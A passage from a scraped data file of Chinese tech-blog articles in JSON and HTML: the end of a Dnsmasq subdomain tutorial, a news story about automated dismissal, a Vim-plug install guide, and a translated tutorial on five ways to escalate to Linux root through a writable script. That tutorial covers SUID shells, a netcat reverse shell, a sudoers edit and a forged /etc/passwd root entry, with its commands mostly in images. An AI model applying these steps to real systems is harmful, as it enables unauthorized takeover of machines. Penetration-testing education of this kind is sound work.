class=\"crayon-sy\">.</span><span class=\"crayon-h\">  </span><span class=\"crayon-st\">IN</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">AAAA  </span><span class=\"crayon-v\">fd02</span><span class=\"crayon-o\">:</span><span class=\"crayon-v\">faea</span><span class=\"crayon-o\">:</span><span class=\"crayon-v\">f561</span><span class=\"crayon-o\">:</span><span class=\"crayon-cn\">8fa0</span><span class=\"crayon-o\">:</span><span class=\"crayon-cn\">1</span><span class=\"crayon-o\">::</span><span class=\"crayon-cn\">21</span></div><div class=\"crayon-line\" id=\"crayon-5b4a75459c988073943130-27\"> </div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0051 seconds] -->\r\n<p>接下来生成子域服务器上的轮询记录，方法和前面一样。现在你已经有了多个域名服务器来处理到你的子域的请求。再说一次，BIND 是很复杂的，做同一件事情它有多种方法，因此，给你留的家庭作业是找出适合你使用的最佳配置方法。</p>\n<p>在 Dnsmasq 中做子域委派很容易。在你的主域名服务器上的 <code>dnsmasq.conf</code> 文件中添加如下的行，去指向到子域的域名服务器：</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5b4a75459c98d752709999\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\nserver=/sub.example.com/172.16.1.20\r\nserver=/sub.example.com/172.16.1.21\r\nserver=/sub.example.com/fd02:faea:f561:8fa0:1::20\r\nserver=/sub.example.com/fd02:faea:f561:8fa0:1::21\r\n</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5b4a75459c98d752709999-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4a75459c98d752709999-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-5b4a75459c98d752709999-3\">3</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4a75459c98d752709999-4\">4</div><div class=\"crayon-num\" data-line=\"crayon-5b4a75459c98d752709999-5\">5</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5b4a75459c98d752709999-1\"><span class=\"crayon-v\">server</span><span class=\"crayon-o\">=</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">sub</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">example</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">com</span><span class=\"crayon-o\">/</span><span class=\"crayon-cn\">172.16.1.20</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4a75459c98d752709999-2\"><span class=\"crayon-v\">server</span><span class=\"crayon-o\">=</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">sub</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">example</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">com</span><span class=\"crayon-o\">/</span><span class=\"crayon-cn\">172.16.1.21</span></div><div class=\"crayon-line\" id=\"crayon-5b4a75459c98d752709999-3\"><span class=\"crayon-v\">server</span><span class=\"crayon-o\">=</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">sub</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">example</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">com</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">fd02</span><span class=\"crayon-o\">:</span><span class=\"crayon-v\">faea</span><span class=\"crayon-o\">:</span><span class=\"crayon-v\">f561</span><span class=\"crayon-o\">:</span><span class=\"crayon-cn\">8fa0</span><span class=\"crayon-o\">:</span><span class=\"crayon-cn\">1</span><span class=\"crayon-o\">::</span><span class=\"crayon-cn\">20</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4a75459c98d752709999-4\"><span class=\"crayon-v\">server</span><span class=\"crayon-o\">=</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">sub</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">example</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">com</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">fd02</span><span class=\"crayon-o\">:</span><span class=\"crayon-v\">faea</span><span class=\"crayon-o\">:</span><span class=\"crayon-v\">f561</span><span class=\"crayon-o\">:</span><span class=\"crayon-cn\">8fa0</span><span class=\"crayon-o\">:</span><span class=\"crayon-cn\">1</span><span class=\"crayon-o\">::</span><span class=\"crayon-cn\">21</span></div><div class=\"crayon-line\" id=\"crayon-5b4a75459c98d752709999-5\"> </div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0014 seconds] -->\r\n<p>然后在子域的域名服务器上的 <code>/etc/hosts</code> 中配置轮询。</p>\n<p>获取配置方法的详细内容和帮助，请参考这些资源：</p>\n<ul>\n<li><a href=\"http://www.thekelleys.org.uk/dnsmasq/doc.html\">Dnsmasq</a></li>\n<li><a href=\"http://shop.oreilly.com/product/9780596100575.do\">DNS and BIND, 5th Edition</a></li>\n</ul>\n<p>通过来自 Linux 基金会和 edX 的免费课程 <a href=\"https://training.linuxfoundation.org/linux-courses/system-administration-training/introduction-to-linux\">“Linux 入门” </a> 学习更多 Linux 的知识。</p>\n\r\n        \r\n        \r\n        \n    <div class=\"post-adds\">\n        <span data-post-id=\"114157\" class=\" btn-bluet-bigger href-style vote-post-up   register-user-only \"><i class=\"fa  fa-thumbs-o-up\"></i> <h10 id=\"114157votetotal\">1</h10> 赞</span>\n        <span data-book-type=\"1\" data-site-id=\"2\" data-item-id=\"114157\" data-item-type=\"1\" class=\" btn-bluet-bigger href-style bookmark-btn  register-user-only \"><i class=\"fa fa-bookmark-o  \"></i>  收藏</span>\n\n                    <a href=\"#article-comment\"><span class=\"btn-bluet-bigger href-style hide-on-480\"><i class=\"fa fa-comments-o\"></i>  评论</span></a>\n        \n        \n        \n        <!-- JiaThis Button BEGIN -->\n        <div class=\"jiathis_style_24x24\" style=\"display: inline-flex; position: relative; margin: 0; clear: both;float: right;\">\n            <a class=\"jiathis_button_tsina\"></a>\n            <a class=\"jiathis_button_weixin\"></a>\n            <a class=\"jiathis_button_qzone\"></a>\n            <a class=\"jiathis_button_fb hide-on-480\"></a>\n            <a href=\"http://www.jiathis.com/share?uid=1745061\" class=\"jiathis jiathis_txt jiathis_separator jtico jtico_jiathis\" target=\"_blank\"></a>\n        </div>\n\n    </div>\n\n\n\n\r\n        <!-- BEGIN #author-bio -->\r\n\r\n\r\n<!-- END #author-bio -->\r\n\t</div>", "tags": "IT技术,Linux", "url": "http://blog.jobbole.com/114157/", "url_obj_id": "1d572c5a3d4363cbf04c9d85ab99bc4e"}
{"front_img_url": ["http://wx1.sinaimg.cn/mw690/63918611gy1fsnj3dqw5ij20hj0cpn3g.jpg"], "title": "工作 8 个月后，一名工程师竟然被机器解雇了", "create_date": "2018/06/25 ·", "praise_num": 1, "fav_num": 0, "comment_num": 0, "content": "<div class=\"entry\">\r\n\r\n        \t\t\t<div class=\"textwidget\"></div>\n\t\t\r\n\t\t<div class=\"copyright-area\">原文出处： <a target=\"_blank\" href=\"https://www.oschina.net/news/97362/when-a-machine-fired-me\">达尔文</a>   </div><p>Ibrahim Diallo 发表了一篇博客，描述了自己认真地工作却被“强大”的机器系统强制解雇的真实经历，并表示，事情发生的从始至终都没有人能够阻止它。</p>\n<p>Diallo 在文中描述，自己在某天上班时，发现门卡失效，当他找到主管时，又意外发现了自己已经被解雇的邮件，却不知道是谁发的：</p>\n<p><img src=\"http://wx1.sinaimg.cn/mw690/63918611gy1fsnj3dqw5ij20hj0cpn3g.jpg\"></p>\n<p>Diallo 随后来到工作岗位，发现自己的 Jira（项目与事务跟踪工具）账号被禁用，当他找经理重新启用账号时，系统却不允许经理进行重新启用的操作。Diallo 回到办公桌前，发现系统提示他重启电脑，但他知道重启后会导致数据丢失，因此并未进行此操作，可 Windows 电脑最后却自动重启了，导致几十万条记录丢失，Web 界面也不响应了。</p>\n<p>随后 Diallo 用他 CentOS 的机器黑进他的服务器去重启，调试，重启所有访问，然后重新处理所有数据。</p>\n<p>后来问题终于得到解决，谈到整件事情的起因时，Diallo 解释道：</p>\n<blockquote><p>我的合同期限是三年，而我仅工作了八个月。原来在我被解雇之前，公司被一家更大的公司收购，而我正是在收购的过程中加入的。当时由于经理的疏忽，没有给我的合同续约，导致合同中止。</p>\n<p>而按照我们的系统设定，一旦员工合同中止的工作单发出后，系统就会接管一切。所有中止合同所需的工作单会自动发出，每个都会触发其他的工作单。于是就有了我的门卡失效，Windows 账号和 Jira 账号被禁用事情的发生，等等。</p>\n<p><strong>而这整个过程持续了好几天，期间却没有任何方法能人为中止。</strong>我只能以新员工的方式被重新雇佣，意味着我得重新填写各种文件，设置银行卡账号，等联邦快递给我发送新的门卡。</p></blockquote>\n<p>作者在文中将整个过程称为：<strong>一个简单的自动化错误/功能导致的雪崩。</strong>自动化也许给我们的生活和办公带来许多便利，但当机器犯错误时，人必须能够干预。如若不能，可能就会出现上面作者描述的情况，甚至会导致更加严重的问题。想详细了解事件发生的读者可以查看作者的<a href=\"https://idiallo.com/blog/when-a-machine-fired-me\">博客原文</a>。</p>\n\r\n        \r\n        \r\n        \n    <div class=\"post-adds\">\n        <span data-post-id=\"114154\" class=\" btn-bluet-bigger href-style vote-post-up   register-user-only \"><i class=\"fa  fa-thumbs-o-up\"></i> <h10 id=\"114154votetotal\">1</h10> 赞</span>\n        <span data-book-type=\"1\" data-site-id=\"2\" data-item-id=\"114154\" data-item-type=\"1\" class=\" btn-bluet-bigger href-style bookmark-btn  register-user-only \"><i class=\"fa fa-bookmark-o  \"></i>  收藏</span>\n\n                    <a href=\"#article-comment\"><span class=\"btn-bluet-bigger href-style hide-on-480\"><i class=\"fa fa-comments-o\"></i>  评论</span></a>\n        \n        \n        \n        <!-- JiaThis Button BEGIN -->\n        <div class=\"jiathis_style_24x24\" style=\"display: inline-flex; position: relative; margin: 0; clear: both;float: right;\">\n            <a class=\"jiathis_button_tsina\"></a>\n            <a class=\"jiathis_button_weixin\"></a>\n            <a class=\"jiathis_button_qzone\"></a>\n            <a class=\"jiathis_button_fb hide-on-480\"></a>\n            <a href=\"http://www.jiathis.com/share?uid=1745061\" class=\"jiathis jiathis_txt jiathis_separator jtico jtico_jiathis\" target=\"_blank\"></a>\n        </div>\n\n    </div>\n\n\n\n\r\n        <!-- BEGIN #author-bio -->\r\n\r\n\r\n<!-- END #author-bio -->\r\n\t</div>", "tags": "业界,自动化", "url": "http://blog.jobbole.com/114154/", "url_obj_id": "2967d3141d2e16cd5b82bc162f3a4648"}
{"front_img_url": ["http://jbcdn2.b0.upaiyun.com/2018/01/1b8322e1daff605d71fc81e724421f17.jpg"], "title": "通过可写文件获取 Linux root 权限的 5 种方法", "create_date": "2018/06/26 ·", "praise_num": 2, "fav_num": 1, "comment_num": 1, "content": "<div class=\"entry\">\r\n\r\n        \t\t\t<div class=\"textwidget\"></div>\n\t\t\r\n\t\t<div class=\"copyright-area\">原文出处： <a ref=\"nofollow\" target=\"_blank\" href=\"http://www.hackingarticles.in/multiple-ways-to-get-root-through-writable-file/\">Raj Chandel</a>   译文出处：<a target=\"_blank\" href=\"http://www.4hou.com/technology/12134.html\">ang010ela</a>   </div><p>Linux系统中，全部都是以文件形式存在的，包括目录、设备都是有权限的，共有读、写、可执行三种。管理员为文件设置好权限后，应该要考虑哪些Linux用户会被允许和限制上述的三个权限。</p>\n<p>通过可写脚本进行root提取的5种方法：</p>\n<p><strong>· </strong>复制 /bin/sh 到 /tmp</p>\n<p><strong>· </strong>设定 /bin/dash的SUID位</p>\n<p><strong>· </strong>通过sudoer给登录用户完全的权限</p>\n<p><strong>· </strong>设定/bin/cp的SUID位</p>\n<p><strong>· </strong>逆向连接到恶意代码</p>\n<p>开启攻击机器，黑掉目标系统，然后进行权限提升。假设成功地通过ssh登录到受害者的机器，并可以访问非root的用户终端。然后使用下面的命令，下面会举例所有有写权限的二进制文件。</p>\n<p><img class=\"aligncenter\" title=\"1529412592363232.png\" src=\"http://jbcdn2.b0.upaiyun.com/2018/06/1e7977c9bc9757738b3a866488ea5d62.png\" alt=\"image.png\"></p>\n<p>可以看到一个/lib/log中保存的python文件，在路径中我们看到了sanitizer.py文件的权限为777。</p>\n<p><img class=\"aligncenter\" title=\"1529412639504718.png\" src=\"http://jbcdn2.b0.upaiyun.com/2018/06/964f0d836515a1f465fa5dc271d2f0a1.png\" alt=\"image.png\"></p>\n<p>Admin要将下面的脚本加入，来清理/tmp中的垃圾文件。如果攻击者能够识别受害者机器中的这类情形，就可以通过下面的方式来提升root权限来破坏系统。</p>\n<p><img class=\"aligncenter\" title=\"1529412656940436.png\" src=\"http://jbcdn2.b0.upaiyun.com/2018/06/39214efb2063fa48217699186079c317.png\" alt=\"image.png\"></p>\n<p><strong>第一种方法</strong></p>\n<p>有许多的方法可以获取root权限，本方法中，我们将/bin/sh复制到/tmp文件夹中，然后设置/tmp/sh的SUID。这种方式非常简单，首先，通过nano编辑器打开文件，然后用rm -r /tmp/* 替换下面的命令：</p>\n<p><img class=\"aligncenter\" title=\"1529412681445056.png\" src=\"http://jbcdn2.b0.upaiyun.com/2018/06/dcf60a5fe3c007b80794b0c24ce5f6af.png\" alt=\"image.png\"></p>\n<p>在/tmp目录创建一个有SUID权限的sh文件后，允许sh文件时会有root访问权限。</p>\n<p><img class=\"aligncenter\" title=\"1529412695478987.png\" src=\"http://jbcdn2.b0.upaiyun.com/2018/06/0d5093e8d17512913d21f495b117af49.png\" alt=\"image.png\"></p>\n<p>可以通过下面的图片进行确认：</p>\n<p><img class=\"aligncenter\" title=\"1529412712243123.png\" src=\"http://jbcdn2.b0.upaiyun.com/2018/06/205448a574dc96c889344dc9dafdd8cb.png\" alt=\"image.png\"></p>\n<p><strong>第二种方法</strong></p>\n<p>同样地，可以用rm -r /tmp/* 替换下面行的内容</p>\n<p><img class=\"aligncenter\" title=\"1529412732150633.png\" src=\"http://jbcdn2.b0.upaiyun.com/2018/06/bed4185b31699ce45bfaf3c5619ec88e.png\" alt=\"image.png\"></p>\n<p>在设置了/bin/dash的SUID权限后，运行后就可以获取root权限</p>\n<p><img class=\"aligncenter\" title=\"1529412745399156.png\" src=\"http://jbcdn2.b0.upaiyun.com/2018/06/34b3b42d097322d3fe33db6881f6dc11.png\" alt=\"image.png\"></p>\n<p>可以通过下面的图进行确认：</p>\n<p><img class=\"aligncenter\" title=\"1529412761544191.png\" src=\"http://jbcdn2.b0.upaiyun.com/2018/06/a44576fbd2965f44814965d14a2c9baf.png\" alt=\"image.png\"></p>\n<p><strong>第三种方法</strong></p>\n<p><img class=\"aligncenter\" title=\"1529412774505929.png\" src=\"http://jbcdn2.b0.upaiyun.com/2018/06/1472d7a6a5b70fd0a5caa935b6495cd7.png\" alt=\"image.png\"></p>\n<p>通过netcat逆向了连接后，就可以获取root权限。</p>\n<p>可以通过下面的图进行确认：</p>\n<p><img class=\"aligncenter\" title=\"1529412789517187.png\" src=\"http://jbcdn2.b0.upaiyun.com/2018/06/297bcaf946124ac842925a0ac6a82d09.png\" alt=\"image.png\"></p>\n<p><strong>第4种方法</strong></p>\n<p>另一个方法是给登录的用户sudo权限。下面的图中可以看出当前用户wernerbrandes不能允许sudo命令。</p>\n<p><img class=\"aligncenter\" title=\"1529412804140224.png\" src=\"http://jbcdn2.b0.upaiyun.com/2018/06/253ff8bf45823dc36d7dfd382bdd1ad5.png\" alt=\"image.png\"></p>\n<p>同样地，可以在下面替换rm -r /tmp/*</p>\n<p><img class=\"aligncenter\" title=\"1529412823891649.png\" src=\"http://jbcdn2.b0.upaiyun.com/2018/06/2526a8e7e2c6b56429b1401b51f05ecd.png\" alt=\"image.png\"></p>\n<p>当输入“sudo -l”命令时会发现，这是sudo用户的一个成员。可以利用sudo bash来获取root权限。</p>\n<p><img class=\"aligncenter\" title=\"1529412835748075.png\" src=\"http://jbcdn2.b0.upaiyun.com/2018/06/c7880f8f99521d379c511cead4b8d7a0.png\" alt=\"image.png\"></p>\n<p><strong>第5种方法</strong></p>\n<p>因为在linux类系统中，passwd文件起着很重要的作用。所以，如果攻击者有机会修改passwd文件，那么这将会成为一种动态的权限提升的方式。<br>\n同样地，可以利用cat命令查看etc/passwd文件的内容。<br>\nUID:1000 &amp; GID:1000 就是admin组队成员。下面编辑一下nemo记录来使其成为root组成员，选择etc/passwd的整个内容并复制粘贴到空text文件中。</p>\n<p><img class=\"aligncenter\" title=\"1529412862186777.png\" src=\"http://jbcdn2.b0.upaiyun.com/2018/06/c0fac052f49554a228dd7921afb830fb.png\" alt=\"image.png\"></p>\n<p>然后，在一个新的终端上生成一个含salt的密码，然后复制。</p>\n<p><img class=\"aligncenter\" title=\"1529412882678813.png\" src=\"http://jbcdn2.b0.upaiyun.com/2018/06/1aa9b7caf0e0a26b773e5ddc1dd36a89.png\" alt=\"image.png\"></p>\n<p>然后粘贴之前复制的含salt的密码在用户nemo的记录词条的X位置处，并修改UID&amp;GID为0:0。完成上面的步骤后，我们就可以将其保存为passwd。</p>\n<p><img class=\"aligncenter\" title=\"1529412899438763.png\" src=\"http://jbcdn2.b0.upaiyun.com/2018/06/39851bc754c3333d3391754370ca9198.png\" alt=\"image.png\"></p>\n<p>利用可写的脚本替换 “rm -r /tmp/*”</p>\n<p><img class=\"aligncenter\" title=\"1529412924674942.png\" src=\"http://jbcdn2.b0.upaiyun.com/2018/06/1ac119b231c99b98f495d4b68d07401c.png\" alt=\"image.png\"></p>\n<p>设置/bin/cp的SUID来复制文件。</p>\n<p><img class=\"aligncenter\" title=\"1529412935719677.png\" src=\"http://jbcdn2.b0.upaiyun.com/2018/06/7f7a038894570cdee6341602844bb360.png\" alt=\"image.png\"></p>\n<p>将修改后的passwd文件下载受害者机器的/tmp文件夹中。用下面的命令检查/bin/cp的SUID位是否开启。</p>\n<p><img class=\"aligncenter\" title=\"1529412953595227.png\" src=\"http://jbcdn2.b0.upaiyun.com/2018/06/a8322a3d2072ceb1a4b10099f03dec36.png\" alt=\"image.png\"></p>\n<p>下面确认是否改变了passwd文件的内容：</p>\n<p><img class=\"aligncenter\" title=\"1529412972236235.png\" src=\"http://jbcdn2.b0.upaiyun.com/2018/06/d2e4f2d6ee16c639cfcc3fe0516161f5.png\" alt=\"image.png\"></p>\n<p>可以看出passwd文件中的变化：</p>\n<p><img class=\"aligncenter\" title=\"1529412987405083.png\" src=\"http://jbcdn2.b0.upaiyun.com/2018/06/0dae580655080853330e9dc34bf88e6e.png\" alt=\"image.png\"></p>\n<p>可以执行下面的命令来获取root权限：</p>\n<p><img class=\"aligncenter\" title=\"1529413000676512.png\" src=\"http://jbcdn2.b0.upaiyun.com/2018/06/19e39ae621feb388e358cd0783dd0cff.png\" alt=\"image.png\"></p>\n<p>本文证明了攻击者如何通过可写文件进行linux系统权限提升。</p>\n\r\n        \r\n        \r\n        \n    <div class=\"post-adds\">\n        <span data-post-id=\"114159\" class=\" btn-bluet-bigger href-style vote-post-up   register-user-only \"><i class=\"fa  fa-thumbs-o-up\"></i> <h10 id=\"114159votetotal\">2</h10> 赞</span>\n        <span data-book-type=\"1\" data-site-id=\"2\" data-item-id=\"114159\" data-item-type=\"1\" class=\" btn-bluet-bigger href-style bookmark-btn  register-user-only \"><i class=\"fa fa-bookmark-o  \"></i> 1 收藏</span>\n\n                    <a href=\"#article-comment\"><span class=\"btn-bluet-bigger href-style hide-on-480\"><i class=\"fa fa-comments-o\"></i> 1 评论</span></a>\n        \n        \n        \n        <!-- JiaThis Button BEGIN -->\n        <div class=\"jiathis_style_24x24\" style=\"display: inline-flex; position: relative; margin: 0; clear: both;float: right;\">\n            <a class=\"jiathis_button_tsina\"></a>\n            <a class=\"jiathis_button_weixin\"></a>\n            <a class=\"jiathis_button_qzone\"></a>\n            <a class=\"jiathis_button_fb hide-on-480\"></a>\n            <a href=\"http://www.jiathis.com/share?uid=1745061\" class=\"jiathis jiathis_txt jiathis_separator jtico jtico_jiathis\" target=\"_blank\"></a>\n        </div>\n\n    </div>\n\n\n\n\r\n        <!-- BEGIN #author-bio -->\r\n\r\n\r\n<!-- END #author-bio -->\r\n\t</div>", "tags": "IT技术,Linux", "url": "http://blog.jobbole.com/114159/", "url_obj_id": "cbb3b429719bda3e099c2522f8c301a8"}
{"front_img_url": ["http://jbcdn2.b0.upaiyun.com/2018/06/e10fe1fd7da125e34ea34b9f5dad9c30.png"], "title": "Vim-plug：极简 Vim 插件管理器", "create_date": "2018/06/17 ·", "praise_num": 1, "fav_num": 0, "comment_num": 0, "content": "<div class=\"entry\">\r\n\r\n        \t\t\t<div class=\"textwidget\"></div>\n\t\t\r\n\t\t<div class=\"copyright-area\">原文出处： <a ref=\"nofollow\" target=\"_blank\" href=\"https://www.ostechnix.com/vim-plug-a-minimalist-vim-plugin-manager/\">Sk</a>   译文出处：<a target=\"_blank\" href=\"https://linux.cn/article-9751-1.html\">Linux中国/geekpi</a>   </div><p><img class=\"aligncenter\" src=\"http://jbcdn2.b0.upaiyun.com/2018/06/e10fe1fd7da125e34ea34b9f5dad9c30.png\" alt=\"\"></p>\n<p>当没有插件管理器时，Vim 用户必须手动下载 tarball 包形式的插件，并将它们解压到 <code>~/.vim</code> 目录中。在少量插件的时候可以。但当他们安装更多的插件时，就会变得一团糟。所有插件文件分散在单个目录中，用户无法找到哪个文件属于哪个插件。此外，他们无法找到他们应该删除哪个文件来卸载插件。这时 Vim 插件管理器就可以派上用场。插件管理器将安装插件的文件保存在单独的目录中，因此管理所有插件变得非常容易。我们几个月前已经写了关于 <a href=\"https://linux.cn/article-9416-1.html\">Vundle</a> 的文章。今天，我们将看到又一个名为 “Vim-plug” 的 Vim 插件管理器。</p>\n<p>Vim-plug 是一个自由、开源、速度非常快的、极简的 vim 插件管理器。它可以并行地安装或更新插件。你还可以回滚更新。它创建浅层克隆shallow clone最小化磁盘空间使用和下载时间。它支持按需加载插件以加快启动时间。其他值得注意的特性是支持分支/标签/提交、post-update 钩子、支持外部管理的插件等。</p>\n<h3 id=\"toc_1\">安装</h3>\n<p>安装和使用起来非常容易。你只需打开终端并运行以下命令：</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5b4a752942845415576665\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\n$ curl -fLo ~/.vim/autoload/plug.vim --create-dirs https://raw.githubusercontent.com/junegunn/vim-plug/master/plug.vim\r\n</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5b4a752942845415576665-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4a752942845415576665-2\">2</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5b4a752942845415576665-1\"><span class=\"crayon-sy\">$</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">curl</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-v\">fLo</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">~</span><span class=\"crayon-o\">/</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">vim</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">autoload</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">plug</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">vim</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">--</span><span class=\"crayon-v\">create</span><span class=\"crayon-o\">-</span><span class=\"crayon-e\">dirs </span><span class=\"crayon-v\">https</span><span class=\"crayon-o\">:</span><span class=\"crayon-c\">//raw.githubusercontent.com/junegunn/vim-plug/master/plug.vim</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4a752942845415576665-2\"> </div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0009 seconds] -->\r\n<p>Neovim 用户可以使用以下命令安装 Vim-plug：</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5b4a75294284e866918147\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly 